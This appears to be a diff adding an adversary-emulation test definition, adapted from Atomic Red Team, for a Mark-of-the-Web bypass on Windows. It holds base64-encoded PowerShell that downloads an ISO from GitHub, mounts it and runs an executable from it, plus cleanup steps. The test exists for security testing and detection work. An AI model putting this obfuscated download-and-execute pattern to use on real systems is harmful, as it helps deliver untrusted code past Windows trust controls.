@@ -1,0 +1,24 @@
+- id: e7e17290-90b1-5b80-952d-d7d6e13e02b0
+  name: Soumaia ART Tests - Mount an ISO image and run executable from the ISO
+  description: "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/, (requires elevation)"
+  tactic: defense-impairment
+  technique:
+    attack_id: T1553.005
+    name: 'Subvert Trust Controls: Mark-of-the-Web Bypass'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEYAZQBlAGwAVABoAGUAQgB1AHIAbgAuAGkAcwBvACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABGAGUAZQBsAFQAaABlAEIAdQByAG4ALgBpAHMAbwAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEANQA1ADMALgAwADAANQAvAGIAaQBuAC8ARgBlAGUAbABUAGgAZQBCAHUAcgBuAC4AaQBzAG8AIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABGAGUAZQBsAFQAaABlAEIAdQByAG4ALgBpAHMAbwAiAAoA
+          }
+          Mount-DiskImage -ImagePath ".\FeelTheBurn.iso" -StorageType ISO -Access ReadOnly
+          $keep = Get-Volume -FileSystemLabel "TestIso"
+          $driveLetter = ($keep | Get-Volume).DriveLetter
+          invoke-item "$($driveLetter):\hello.exe"
+        cleanup: |-
+          Dismount-DiskImage -ImagePath ".\FeelTheBurn.iso" | Out-Null
+          Stop-process -name "hello" -Force -ErrorAction ignore
+        payloads:
+        - FeelTheBurn.iso
